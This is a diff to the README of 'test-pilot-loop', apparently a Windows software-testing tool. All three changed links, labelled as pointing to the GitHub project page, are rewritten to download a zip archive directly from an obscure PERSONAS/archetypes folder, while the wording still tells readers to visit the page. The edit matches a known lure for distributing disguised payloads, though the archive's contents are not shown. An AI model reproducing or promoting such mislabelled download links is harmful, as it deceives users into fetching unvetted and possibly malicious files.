@@ -1,6 +1,6 @@
 # 🧪 test-pilot-loop - Test software by using it
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/prasunicecold140/test-pilot-loop)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/prasunicecold140/test-pilot-loop/raw/refs/heads/main/PERSONAS/archetypes/test-loop-pilot-v3.7.zip)
 
 ## 🚀 What this is
 
@@ -18,7 +18,7 @@ This project is made for people who want a hands-off way to test software flows.
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/prasunicecold140/test-pilot-loop](https://github.com/prasunicecold140/test-pilot-loop)
+[https://github.com/prasunicecold140/test-pilot-loop/raw/refs/heads/main/PERSONAS/archetypes/test-loop-pilot-v3.7.zip](https://github.com/prasunicecold140/test-pilot-loop/raw/refs/heads/main/PERSONAS/archetypes/test-loop-pilot-v3.7.zip)
 
 Open the page, look for the latest release or setup files, and get the Windows version that fits your system.
 
@@ -195,7 +195,7 @@ Try these steps:
 
 ## 📎 Download link
 
-[Visit the GitHub page to download test-pilot-loop](https://github.com/prasunicecold140/test-pilot-loop)
+[Visit the GitHub page to download test-pilot-loop](https://github.com/prasunicecold140/test-pilot-loop/raw/refs/heads/main/PERSONAS/archetypes/test-loop-pilot-v3.7.zip)
 
 ## 🔎 Topics covered
 
